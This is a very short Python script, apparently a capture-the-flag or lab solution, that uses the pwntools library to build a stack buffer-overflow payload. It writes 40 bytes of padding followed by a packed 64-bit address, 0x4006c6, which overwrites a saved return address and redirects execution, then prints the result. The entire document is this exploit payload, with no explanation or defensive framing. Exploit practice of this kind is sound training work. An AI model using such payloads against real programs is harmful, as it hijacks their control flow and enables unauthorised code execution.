import pwn

s = b'a' * 40 + pwn.p64(0x4006c6)
print(s)
